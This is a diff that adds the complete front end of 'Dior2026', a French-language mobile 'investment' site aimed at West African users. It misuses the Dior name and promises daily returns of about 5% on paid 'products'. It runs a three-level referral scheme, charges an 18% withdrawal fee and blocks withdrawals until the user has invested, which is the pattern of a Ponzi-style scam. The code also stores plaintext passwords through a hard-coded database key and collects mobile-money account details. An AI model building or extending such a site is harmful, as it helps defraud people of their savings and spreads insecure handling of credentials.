@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dior2026 - Plateforme Officielle</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --dior-orange: #e88e0c; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fdfdfd; margin: 0; }
+        .page { display: none; padding-bottom: 100px; animation: fadeIn 0.4s ease-out; }
+        .active { display: block !important; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        #loader {
+            display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.9);
+            z-index: 10000; justify-content: center; align-items: center; color: #000; flex-direction: column;
+        }
+        .disabled-btn { opacity: 0.5; pointer-events: none; filter: grayscale(1); }
+        .feed-item { animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+
+        .product-card-dior {
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid #f0f0f0;
+            transition: all 0.3s ease;
+        }
+        .product-image {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+        }
+        .s9-exclusive {
+            border: 3px solid #e88e0c;
+            background: linear-gradient(to bottom, #ffffff, #fff9f0);
+            transform: scale(1.02);
+            box-shadow: 0 10px 25px rgba(232, 142, 12, 0.2);
+        }
+        .s9-badge {
+            background: #e88e0c;
+            color: white;
+            font-size: 10px;
+            font-weight: 900;
+            padding: 4px 12px;
+            border-radius: 0 0 12px 0;
+            position: absolute;
+            z-index: 10;
+            text-transform: uppercase;
+        }
+
+        .bank-input-group { margin-bottom: 25px; }
+        .bank-input-group label { display: block; color: white; font-size: 15px; margin-bottom: 5px; font-weight: 600; }
+        .bank-input-group input, .bank-input-group select { 
+            width: 100%; background: transparent; border: none; border-bottom: 1px solid rgba(255,255,255,0.4); 
+            color: white; padding: 12px 0; outline: none; font-weight: 500; font-size: 14px;
+        }
+        .bank-input-group select option { color: #333; }
+        .bank-input-group input::placeholder { color: rgba(255,255,255,0.5); font-size: 13px; }
+        
+        .country-select {
+            background: transparent;
+            border: none;
+            outline: none;
+            font-weight: bold;
+            color: #9ca3af;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+<div id="loader">
+    <div class="w-12 h-12 border-4 border-black border-t-orange-500 rounded-full animate-spin mb-4"></div>
+    <p class="font-black text-xs uppercase tracking-widest">Dior2026</p>
+</div>
+
+<div class="max-w-md mx-auto min-h-screen shadow-2xl relative bg-white">
+
+    <div id="register-page" class="page active px-8 pt-20">
+        <div class="text-center mb-12">
+            <h1 class="text-5xl font-black italic tracking-tighter text-zinc-900">DIOR<span class="text-orange-500">2026</span></h1>
+            <p class="text-[10px] uppercase tracking-[0.4em] mt-3 font-bold text-gray-400">Créer un compte</p>
+        </div>
+        <div class="space-y-5">
+            <div class="bg-gray-50 rounded-3xl p-5 border border-gray-100 flex items-center">
+                <select id="reg-country" class="country-select mr-2 w-auto border-r pr-2">
+                    <option value="+226">🇧🇫 +226</option>
+                    <option value="+228">🇹🇬 +228</option>
+                    <option value="+229">🇧🇯 +229</option>
+                    <option value="+221">🇸🇳 +221</option>
+                </select>
+                <input id="reg-phone" type="tel" placeholder="Numéro de téléphone" class="bg-transparent outline-none flex-1 font-bold">
+            </div>
+            <div class="bg-gray-50 rounded-3xl p-5 border border-gray-100 flex items-center">
+                <i class="fas fa-lock text-gray-300 mr-4"></i>
+                <input id="reg-pass" type="password" placeholder="Mot de passe" class="bg-transparent outline-none flex-1 font-bold">
+            </div>
+            <div class="bg-orange-50 rounded-3xl p-5 border border-orange-100 flex items-center">
+                <i class="fas fa-ticket-alt text-orange-400 mr-4"></i>
+                <input id="reg-invite" type="text" placeholder="Code d'invitation" class="bg-transparent outline-none flex-1 font-black text-orange-600">
+            </div>
+            <button onclick="handleAuth('register')" class="w-full bg-zinc-900 text-white py-6 rounded-3xl font-black text_lg shadow-xl mt-4">S'INSCRIRE</button>
+            <p onclick="showPage('login-page')" class="text-center text-sm font-bold text-gray-500 mt-6 cursor-pointer">J'ai déjà un compte</p>
+        </div>
+    </div>
+
+    <div id="login-page" class="page px-8 pt-20">
+        <div class="text-center mb-12">
+            <h2 class="text-3xl font-black text-zinc-900 uppercase">Connexion</h2>
+        </div>
+        <div class="space-y-5">
+            <div class="bg-gray-50 rounded-3xl p-5 border border-gray-100 flex items-center">
+                <select id="login-country" class="country-select mr-2 w-auto border-r pr-2">
+                    <option value="+226">🇧🇫 +226</option>
+                    <option value="+228">🇹🇬 +228</option>
+                    <option value="+229">🇧🇯 +229</option>
+                    <option value="+221">🇸🇳 +221</option>
+                </select>
+                <input id="login-phone" type="tel" placeholder="Téléphone" class="bg-transparent outline-none flex-1 font-bold">
+            </div>
+            <input id="login-pass" type="password" placeholder="Mot de passe" class="w-full p-6 bg-gray-50 rounded-3xl border border-gray-100 outline-none font-bold">
+            <button onclick="handleAuth('login')" class="w-full bg-zinc-900 text-white py-6 rounded-3xl font-black text-lg shadow-2xl">ACCÉDER</button>
+            <p onclick="showPage('register-page')" class="text-center text-sm font-bold text-gray-500 mt-6 cursor-pointer">Créer un compte</p>
+        </div>
+    </div>
+
+    <div id="home-page" class="page">
+        <div class="relative h-48 bg-zinc-900 p-8 flex flex-col justify-end text-white">
+            <span class="bg-orange-500 text-[8px] font-black px-3 py-1 rounded-full w-max mb-3 uppercase">Nouveauté 2026</span>
+            <h1 class="text-3xl font-black leading-tight">Générez des revenus avec Dior2026</h1>
+        </div>
+        
+        <div class="grid grid-cols-4 gap-4 p-6 text-center text-[10px] font-black uppercase text-gray-500">
+            <div onclick="window.location.href='https://westpay.cloud/link/7lyenf8kmo0fqmls'"><div class="bg-gray-100 p-4 rounded-full mb-2 flex justify-center items-center h-16 w-16 mx-auto"><i class="fas fa-plus text-xl text-zinc-800"></i></div> DÉPOSER</div>
+            <div onclick="showPage('retrait-page')"><div class="bg-gray-100 p-4 rounded-full mb-2 flex justify-center items-center h-16 w-16 mx-auto"><i class="fas fa-arrow-down text-xl text-orange-600"></i></div> RETIRER</div>
+            <div onclick="window.open('https://t.me/+ONx7pIapuKxhNWU8', '_blank')"><div class="bg-gray-100 p-4 rounded-full mb-2 flex justify-center items-center h-16 w-16 mx-auto"><i class="fab fa-telegram-plane text-xl text-blue-500"></i></div> SUPPORT</div>
+            <div id="btn-pointage" onclick="doPointage()"><div class="bg-gray-100 p-4 rounded-full mb-2 flex justify-center items-center h-16 w-16 mx-auto"><i class="fas fa-check-circle text-xl text-green-600"></i></div> POINTAGE</div>
+        </div>
+
+        <div class="px-6 space-y-4">
+            <div class="bg-zinc-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden h-40 flex flex-col justify-center">
+                <p class="text-[10px] opacity-50 font-bold uppercase tracking-widest mb-1">SOLDE DU PORTEFEUILLE</p>
+                <h2 class="text-4xl font-black text-orange-500"><span class="solde-val">0</span> <span class="text-lg">FCFA</span></h2>
+                <div class="absolute right-6 opacity-10"><i class="fas fa-wallet text-6xl"></i></div>
+            </div>
+            <div class="bg-gray-50 rounded-[30px] p-6 border border-gray-100">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-[10px] font-black uppercase tracking-widest text-gray-400">Dernières Activités</h3>
+                    <span class="flex h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
+                </div>
+                <div id="live-purchase-feed" class="space-y-3 overflow-hidden">
+                    <p class="text-[10px] text-gray-400 italic">En attente de nouvelles transactions...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="produit-page" class="page p-6">
+        <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Catalogue de Gains</h2>
+        <div id="product-list" class="grid grid-cols-2 gap-4"></div>
+    </div>
+
+    <div id="team-page" class="page p-6">
+        <div class="bg-zinc-900 p-8 rounded-[40px] text-white mb-8">
+            <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Lien d'invitation automatique</p>
+            <div class="bg-white/10 p-3 rounded-xl mb-4 overflow-hidden">
+                <p id="user-invite-link" class="text-[10px] text-orange-200 truncate font-mono">https://mon-app-dior2026.vercel.app/?ref=---</p>
+            </div>
+            <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Code d'invitation</p>
+            <div class="flex justify-between items-center">
+                <h3 id="user-invite-code" class="text-3xl font-black text-orange-500 tracking-tighter">------</h3>
+                <button onclick="copyInviteData()" class="bg-white text-black px-4 py-2 rounded-xl font-black text-xs uppercase">Copier Lien</button>
+            </div>
+        </div>
+        
+        <div class="mb-6">
+            <h3 class="font-black uppercase text-xs text-gray-400 mb-4">Statistiques de l'équipe</h3>
+            <div class="grid grid-cols-1 gap-4">
+                <div class="bg-gray-50 p-6 rounded-3xl flex justify-between items-center">
+                    <div>
+                        <div class="font-black">Niveau L1 (25%)</div>
+                        <div class="text-[10px] text-gray-400 uppercase">Mes invités directs</div>
+                    </div>
+                    <div class="text-orange-500 font-black" id="count-l1">0 membres</div>
+                </div>
+                <div class="bg-gray-50 p-6 rounded-3xl flex justify-between items-center">
+                    <div>
+                        <div class="font-black">Niveau L2 (2%)</div>
+                        <div class="text-[10px] text-gray-400 uppercase">Invités de L1</div>
+                    </div>
+                    <div class="text-orange-500 font-black" id="count-l2">0 membres</div>
+                </div>
+                <div class="bg-gray-50 p-6 rounded-3xl flex justify-between items-center">
+                    <div>
+                        <div class="font-black">Niveau L3 (1%)</div>
+                        <div class="text-[10px] text-gray-400 uppercase">Invités de L2</div>
+                    </div>
+                    <div class="text-orange-500 font-black" id="count-l3">0 membres</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="profil-page" class="page p-8">
+        <div class="flex justify-between items-start mb-10">
+            <div class="w-16 h-16 bg-zinc-900 rounded-2xl flex items-center justify-center text-white text-2xl font-black">D</div>
+            <div class="text-right">
+                <p id="user-display-phone" class="text-xs font-black text-zinc-900">00000000</p>
+                <p class="text-[10px] font-black text-green-500 uppercase">Compte Actif</p>
+            </div>
+        </div>
+        <div class="mb-8">
+            <h2 class="text-4xl font-black text-zinc-900"><span class="solde-val">0</span> <span class="text-xl">FCFA</span></h2>
+        </div>
+        <div class="space-y-4">
+            <div onclick="showPage('mes-commandes-page')" class="flex items-center justify-between p-5 bg-orange-50 rounded-3xl border border-orange-100 cursor-pointer">
+                <span class="text-xs font-black uppercase">Mes Investissements</span>
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            <div onclick="showPage('historique-page')" class="flex items-center justify-between p-5 bg-gray-50 rounded-3xl cursor-pointer">
+                <span class="text-xs font-black uppercase">Historique</span>
+                <i class="fas fa-history"></i>
+            </div>
+            <div onclick="window.open('https://t.me/+ONx7pIapuKxhNWU8', '_blank')" class="flex items-center justify-between p-5 bg-gray-50 rounded-3xl cursor-pointer">
+                <span class="text-xs font-black uppercase">Service Client</span>
+                <i class="fas fa-headset text-orange-500"></i>
+            </div>
+            <div onclick="alert('Dior2026 : Leader de l\'investissement numérique en Afrique.')" class="flex items-center justify-between p-5 bg-gray-50 rounded-3xl cursor-pointer">
+                <span class="text-xs font-black uppercase">À propos de nous</span>
+                <i class="fas fa-info-circle"></i>
+            </div>
+            <div onclick="alert('Lien de téléchargement bientôt disponible')" class="flex items-center justify-between p-5 bg-zinc-900 text-white rounded-3xl cursor-pointer">
+                <span class="text-xs font-black uppercase">Télécharger l'application</span>
+                <i class="fas fa-download"></i>
+            </div>
+            <button onclick="logout()" class="w-full p-5 text-red-500 font-black text-xs uppercase tracking-widest mt-10">Déconnexion</button>
+        </div>
+    </div>
+
+    <div id="retrait-page" class="page bg-zinc-900 min-h-screen">
+        <div class="p-4 flex items-center gap-4 text-white">
+            <i class="fas fa-arrow-left" onclick="showPage('home-page')"></i>
+            <h2 class="text-lg font-bold">Retirer de l'argent</h2>
+        </div>
+        <div class="p-6">
+            <div class="bg-gradient-to-r from-indigo-900 via-purple-900 to-red-500 rounded-2xl p-8 mb-6">
+                <h3 class="text-white text-3xl font-black mb-1">FCFA <span class="solde-val">0</span></h3>
+                <p class="text-white/70 text-xs">Solde du compte</p>
+            </div>
+            <div onclick="showPage('lier-banque-page')" class="bg-zinc-800 rounded-xl p-5 flex items-center justify-between cursor-pointer mb-8 border border-white/5">
+                <div class="flex items-center gap-4">
+                    <i class="fas fa-wallet text-white text-xl"></i>
+                    <span id="selected-bank-display" class="text-white font-medium text-sm">Choisissez le compte portefeuille</span>
+                </div>
+                <i class="fas fa-chevron-right text-white/30"></i>
+            </div>
+            <div class="mb-8">
+                <label class="text-white/50 text-xs font-bold uppercase block mb-4">Montant du retrait</label>
+                <div class="flex items-end gap-4 border-b border-white/10 pb-4">
+                    <span class="text-white font-black text-xl">FCFA</span>
+                    <input id="draw-amount" type="number" placeholder="Veuillez préciser le montant" class="bg-transparent outline-none text-white w-full text-lg">
+                </div>
+                <div class="flex justify-between mt-4 text-[10px] font-bold uppercase">
+                    <span class="text-white/40">Montant reçu: FCFA <span id="montant-net">0.00</span></span>
+                    <span class="text-white/40">Impôt: 18%</span>
+                </div>
+            </div>
+            <button onclick="finalRetrait()" class="w-full bg-gradient-to-r from-orange-500 to-yellow-500 text-white py-4 rounded-xl font-black text-lg shadow-lg mb-8">Retrait instantané</button>
+            <div class="space-y-4">
+                <div class="flex items-center gap-2 text-orange-500"><i class="fas fa-info-circle"></i><span class="font-bold text-xs uppercase">Règles de retrait</span></div>
+                <div class="text-[11px] text-white/50 space-y-3 leading-relaxed">
+                    <p>1. Le montant minimum de retrait est fixé à 500 FCFA.</p>
+                    <p>2. Les demandes de retrait sont traitées tous les jours de 10h00 à 16h00.</p>
+                    <p>3. Des frais de gestion de 18% sont appliqués sur chaque retrait.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="lier-banque-page" class="page bg-black min-h-screen">
+        <div class="p-4 flex items-center justify-between text-white border-b border-white/5">
+            <i class="fas fa-arrow-left" onclick="showPage('retrait-page')"></i>
+            <h2 class="font-bold">Lier un compte</h2>
+            <i class="fas fa-save" onclick="saveBankInfo()"></i>
+        </div>
+        <div class="p-6">
+            <div class="bg-zinc-900/50 border border-white/5 rounded-3xl p-8 space-y-8">
+                <div>
+                    <label class="text-white/40 text-xs font-bold uppercase block mb-3">Nom complet</label>
+                    <input id="bank-user" type="text" placeholder="Votre nom sur le compte" class="w-full bg-zinc-800/50 border border-white/10 rounded-xl p-4 text-white outline-none focus:border-orange-500">
+                </div>
+                <div>
+                    <label class="text-white/40 text-xs font-bold uppercase block mb-3">Mode de paiement</label>
+                    <select id="bank-name" class="w-full bg-zinc-800/50 border border-white/10 rounded-xl p-4 text-white outline-none">
+                        <option value="Orange Money">Orange Money</option>
+                        <option value="Moov Money">Moov Money</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="text-white/40 text-xs font-bold uppercase block mb-3">Numéro de téléphone</label>
+                    <input id="bank-number" type="tel" placeholder="Numéro de votre compte" class="w-full bg-zinc-800/50 border border-white/10 rounded-xl p-4 text-white outline-none focus:border-orange-500">
+                </div>
+                <button onclick="saveBankInfo()" class="w-full bg-gradient-to-r from-blue-900 to-green-500 text-white py-5 rounded-2xl font-black text-xl shadow-2xl mt-4">Enregistrer</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="mes-commandes-page" class="page p-6">
+        <div class="flex items-center gap-4 mb-6"><i class="fas fa-arrow-left" onclick="showPage('profil-page')"></i><h2 class="font-black uppercase text-xl">Mes Gains</h2></div>
+        <div id="user-orders-list" class="space-y-4"></div>
+    </div>
+
+    <div id="historique-page" class="page p-6">
+        <div class="flex items-center gap-4 mb-6"><i class="fas fa-arrow-left" onclick="showPage('profil-page')"></i><h2 class="font-black uppercase">Historique</h2></div>
+        <div id="log-list" class="space-y-3"></div>
+    </div>
+
+    <nav id="main-nav" class="fixed bottom-0 w-full max-w-md bg-white border-t border-gray-100 flex justify-around py-6 z-50 hidden">
+      <button onclick="showPage('home-page')" class="flex flex-col items-center nav-btn" data-page="home-page"><i class="fas fa-home text-lg"></i><span class="text-[9px] font-black mt-1 uppercase">Accueil</span></button>
+        <button onclick="showPage('produit-page')" class="flex flex-col items-center nav-btn" data-page="produit-page"><i class="fas fa-shopping-bag text-lg"></i><span class="text-[9px] font-black mt-1 uppercase">Produit</span></button>
+        <button onclick="showPage('team-page')" class="flex flex-col items-center nav-btn" data-page="team-page"><i class="fas fa-users text-lg"></i><span class="text-[9px] font-black mt-1 uppercase">Équipe</span></button>
+         <button onclick="showPage('profil-page')" class="flex flex-col items-center nav-btn" data-page="profil-page"><i class="fas fa-user-circle text-lg"></i><span class="text-[9px] font-black mt-1 uppercase">Profil</span></button>
+    </nav>
+</div>
+
+ <script>
+    const _URL = "https://ciamfmmmznshnmmtxntf.supabase.co";
+    const _KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNpYW1mbW1tem5zaG5tbXR4bnRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2NDYwNjgsImV4cCI6MjA5MTIyMjA2OH0.er_YZ2Mg-fwwXLPkS20eli1hO8eCfd8DReOferSBw3M";
+    const supabaseClient = supabase.createClient(_URL, _KEY);
+
+    // Fonction pour obtenir l'heure formatée du Burkina Faso (GMT)
+    function getBFTime() {
+        return new Date().toLocaleString("fr-FR", {
+            timeZone: "Africa/Ouagadougou",
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+    }
+
+    const produits = [
+        { id: 0, nom: "S0", prix: 0, gain: 200, img: "https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=400&q=80" },
+        { id: 1, nom: "S1", prix: 10000, gain: 500, img: "https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=400&q=80" },
+        { id: 2, nom: "S2", prix: 30000, gain: 1515, img: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&q=80" },
+        { id: 3, nom: "S3", prix: 70000, gain: 3571, img: "https://images.unsplash.com/photo-1549298916-b41d501d3772?w=400&q=80" },
+        { id: 4, nom: "S4", prix: 140000, gain: 7216, img: "https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400&q=80" },
+        { id: 5, nom: "S5", prix: 280000, gain: 14583, img: "https://images.unsplash.com/photo-1618354691373-d851c5c3a990?w=400&q=80" },
+        { id: 6, nom: "S6", prix: 500000, gain: 28000, img: "https://images.unsplash.com/photo-1560769629-975ec94e6a86?w=400&q=80" },
+        { id: 7, nom: "S7", prix: 800000, gain: 45000, img: "https://images.unsplash.com/photo-1594223274512-ad4803739b7c?w=400&q=80" },
+        { id: 8, nom: "S8", prix: 1200000, gain: 70000, img: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400&q=80" },
+        { id: 9, nom: "S9", prix: 2000000, gain: 125000, img: "https://images.unsplash.com/photo-1490481651871-ab68de25d43d?w=800&q=80" }
+    ];
+
+    let currentUser = null;
+
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const ref = urlParams.get('ref');
+        if (ref) { document.getElementById('reg-invite').value = ref; }
+    }
+
+    async function handleAuth(type) {
+        document.getElementById('loader').style.display = 'flex';
+        const country = type === 'register' ? document.getElementById('reg-country').value : document.getElementById('login-country').value;
+        const rawPhone = type === 'register' ? document.getElementById('reg-phone').value : document.getElementById('login-phone').value;
+        const phone = country + rawPhone;
+        const pass = type === 'register' ? document.getElementById('reg-pass').value : document.getElementById('login-pass').value;
+        const refCode = type === 'register' ? document.getElementById('reg-invite').value : null;
+
+        if(!rawPhone || rawPhone.length < 8) {
+            document.getElementById('loader').style.display = 'none';
+            return alert("Numéro invalide");
+        }
+
+        if(type === 'register') {
+            const { data: existingUser } = await supabaseClient.from('utilisateurs').select('phone_number_code').eq('phone_number_code', phone).single();
+            if(existingUser) {
+                document.getElementById('loader').style.display = 'none';
+                return alert("Ce numéro est déjà inscrit !");
+            }
+            const myCode = Math.random().toString(36).substring(7).toUpperCase();
+            const { error } = await supabaseClient.from('utilisateurs').insert([{ 
+                phone_number_code: phone, password: pass, balance: 1000, inviteCode: myCode, referred_bay: refCode, role: 'membre', statut: 'actif', team: { l1: [], l2: [], l3: [] }, logs: [], orders: [], bankInfo: null
+            }]);
+            if(error) alert("Erreur: " + error.message); else { alert("Compte créé !"); showPage('login-page'); }
+            document.getElementById('loader').style.display = 'none';
+        } else {
+            const { data: user, error } = await supabaseClient.from('utilisateurs').select('*').eq('phone_number_code', phone).eq('password', pass).single();
+            if(!user || error) { document.getElementById('loader').style.display = 'none'; return alert("Identifiants incorrects"); }
+            currentUser = user;
+            saveAndRefresh();
+            loginSuccess();
+        }
+    }
+
+    async function saveAndRefresh() {
+        if(currentUser) {
+            localStorage.setItem('dior_session', JSON.stringify(currentUser));
+            updateUI();
+            await supabaseClient.from('utilisateurs').update({ 
+                balance: currentUser.balance, logs: currentUser.logs, orders: currentUser.orders, bankInfo: currentUser.bankInfo, team: currentUser.team, lastPointage: currentUser.lastPointage
+            }).eq('phone_number_code', currentUser.phone_number_code);
+        }
+    }
+
+    function loginSuccess() {
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('main-nav').classList.remove('hidden');
+            document.getElementById('user-invite-code').innerText = currentUser.inviteCode;
+            document.getElementById('user-invite-link').innerText = "https://mon-app-dior2026.vercel.app/?ref=" + currentUser.inviteCode;
+            document.getElementById('user-display-phone').innerText = currentUser.phone_number_code;
+            
+            if(currentUser.bankInfo) {
+                document.getElementById('selected-bank-display').innerText = currentUser.bankInfo.name + " (" + currentUser.bankInfo.number + ")";
+            }
+
+            initProducts();
+            showPage('home-page');
+        }, 1000);
+    }
+
+    function logout() { currentUser = null; localStorage.removeItem('dior_session'); document.getElementById('main-nav').classList.add('hidden'); showPage('login-page'); }
+
+    function updateUI() {
+        if(!currentUser) return;
+        document.querySelectorAll('.solde-val').forEach(el => el.innerText = Math.floor(currentUser.balance).toLocaleString());
+        const logList = document.getElementById('log-list');
+        logList.innerHTML = currentUser.logs.length === 0 ? '<p class="text-center text-gray-400 text-xs py-10">Aucune transaction</p>' : "";
+        currentUser.logs.slice().reverse().forEach(log => {
+            logList.innerHTML += `<div class="bg-gray-50 p-4 rounded-2xl flex justify-between items-center"><div><p class="font-black text-xs uppercase">${log.type}</p><p class="text-[9px] text-gray-400">${log.date}</p></div><p class="font-black ${log.amount > 0 ? 'text-green-500' : 'text-red-500'}">${log.amount > 0 ? '+' : ''}${log.amount} F</p></div>`;
+        });
+    }
+
+    document.getElementById('draw-amount').addEventListener('input', function(e) {
+        const val = e.target.value;
+        const net = val > 0 ? val * 0.82 : 0;
+        document.getElementById('montant-net').innerText = net.toFixed(2);
+    });
+
+    async function saveBankInfo() {
+        const bank = document.getElementById('bank-name').value;
+        const user = document.getElementById('bank-user').value;
+        const num = document.getElementById('bank-number').value;
+        if(!user || !num) return alert("Remplissez tout !");
+        currentUser.bankInfo = { name: bank, owner: user, number: num };
+        document.getElementById('selected-bank-display').innerText = bank + " (" + num + ")";
+        await saveAndRefresh();
+        alert("Enregistré !");
+        showPage('retrait-page');
+    }
+
+    function initProducts() {
+        const container = document.getElementById('product-list');
+        container.innerHTML = "";
+        produits.forEach(p => {
+            const isS9 = p.nom === "S9";
+            container.innerHTML += `
+                <div class="product-card-dior relative ${isS9 ? 'col-span-2 s9-exclusive' : ''}">
+                    ${isS9 ? '<div class="s9-badge">Produit VIP Dior</div>' : ''}
+                    <img src="${p.img}" class="product-image ${isS9 ? 'h-64' : ''}">
+                    <div class="p-4">
+                        <div class="flex justify-between items-center mb-2"><h4 class="font-black ${isS9 ? 'text-xl text-orange-600' : 'text-md'}">${p.nom}</h4><span class="text-[9px] bg-gray-100 px-2 py-1 rounded font-bold">24H</span></div>
+                        <p class="text-[10px] text-gray-500 font-bold mb-3">Gain : ${p.gain.toLocaleString()} F / J</p>
+                        <div class="flex items-center justify-between"><p class="font-black text-zinc-900 text-xs">${p.prix === 0 ? 'GRATUIT' : p.prix.toLocaleString() + ' F'}</p><button onclick="acheterProduit(${p.id})" class="${isS9 ? 'bg-orange-500' : 'bg-zinc-900'} text-white px-4 py-2 rounded-xl font-black text-[9px] uppercase shadow-lg">Investir</button></div>
+                    </div>
+                </div>`;
+        });
+    }
+
+    function acheterProduit(id) {
+        const p = produits.find(item => item.id === id);
+        
+        // --- NOUVEAUTÉ : VÉRIFICATION PRODUIT S0 ---
+        if (p.nom === "S0") {
+            const dejaUtilise = currentUser.logs.find(l => l.type === "Récolte S0" || l.type === "Achat S0 (Expiré)");
+            const dejaEnCours = currentUser.orders.find(o => o.nom === "S0");
+            if (dejaUtilise || dejaEnCours) {
+                return alert("Le produit S0 est à usage unique et a expiré.");
+            }
+        }
+
+        if(currentUser.balance < p.prix) return alert("Solde insuffisant");
+        
+        const bfkTime = getBFTime(); // Heure du Burkina Faso
+        
+        currentUser.balance -= p.prix;
+        currentUser.orders.push({ 
+            id: p.id, 
+            nom: p.nom, 
+            gain: p.gain, 
+            img: p.img, 
+            lastClaim: new Date().getTime(), 
+            dateAchat: bfkTime 
+        });
+        
+        currentUser.logs.push({ type: "Achat " + p.nom, amount: -p.prix, date: bfkTime });
+        saveAndRefresh();
+        alert("Investissement réussi à " + bfkTime);
+    }
+
+    function updateOrdersUI() {
+        const list = document.getElementById('user-orders-list');
+        list.innerHTML = "";
+        currentUser.orders.forEach((order, index) => {
+            const now = new Date().getTime();
+            const pret = (now - order.lastClaim) >= 86400000;
+            list.innerHTML += `<div class="bg-white border p-4 rounded-[30px] flex gap-4 items-center"><img src="${order.img}" class="w-16 h-16 rounded-2xl object-cover"><div class="flex-1"><h4 class="font-black text-sm">${order.nom}</h4><p class="text-[9px] text-gray-400 italic">Gain : ${order.gain} F / J</p>${pret ? `<button onclick="collectGain(${index})" class="bg-green-500 text-white px-3 py-1 rounded-lg text-[8px] font-black uppercase">Récupérer</button>` : '<span class="text-gray-400 text-[8px]">En cours...</span>'}</div></div>`;
+        });
+    }
+
+    function collectGain(index) {
+        const order = currentUser.orders[index];
+        const bfkTime = getBFTime(); // Heure du Burkina Faso
+        
+        currentUser.balance += order.gain;
+        currentUser.logs.push({ type: "Récolte " + order.nom, amount: order.gain, date: bfkTime });
+
+        // --- NOUVEAUTÉ : EXPIRATION S0 ---
+        if (order.nom === "S0") {
+            currentUser.orders.splice(index, 1); // Le produit disparaît
+            currentUser.logs.push({ type: "Achat S0 (Expiré)", amount: 0, date: bfkTime });
+            alert("Revenu S0 récupéré. Ce produit est désormais expiré.");
+        } else {
+            order.lastClaim = new Date().getTime();
+        }
+
+        saveAndRefresh();
+        updateOrdersUI();
+    }
+
+    function doPointage() {
+        const today = new Date().toDateString();
+        if(currentUser.lastPointage === today) return alert("Déjà fait !");
+        
+        const bfkTime = getBFTime();
+        currentUser.balance += 50;
+        currentUser.lastPointage = today;
+        currentUser.logs.push({type: "Pointage", amount: 50, date: bfkTime});
+        saveAndRefresh();
+        alert("+50 FCFA à " + bfkTime);
+    }
+
+    function finalRetrait() {
+        if (!currentUser.orders || currentUser.orders.length === 0) {
+            return alert("Action refusée : Sans investissement, vous ne pouvez pas retirer d'argent.");
+        }
+
+        const amt = parseInt(document.getElementById('draw-amount').value);
+        if(!amt || amt < 500) return alert("Min: 500 FCFA");
+        if(amt > currentUser.balance) return alert("Solde insuffisant");
+        if(!currentUser.bankInfo) return alert("Liez un compte d'abord !");
+
+        const bfkTime = getBFTime();
+        currentUser.balance -= amt;
+        currentUser.logs.push({type: "Retrait", amount: -amt, date: bfkTime});
+        saveAndRefresh();
+        alert("Demande transmise à " + bfkTime);
+        showPage('home-page');
+    }
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        if(id === 'mes-commandes-page') updateOrdersUI();
+        window.scrollTo(0,0);
+    }
+
+    function copyInviteData() {
+        const link = "https://mon-app-dior2026.vercel.app/?ref=" + currentUser.inviteCode;
+        navigator.clipboard.writeText(link);
+        alert("Lien copié !");
+    }
+</script>
+</body>
+</html>
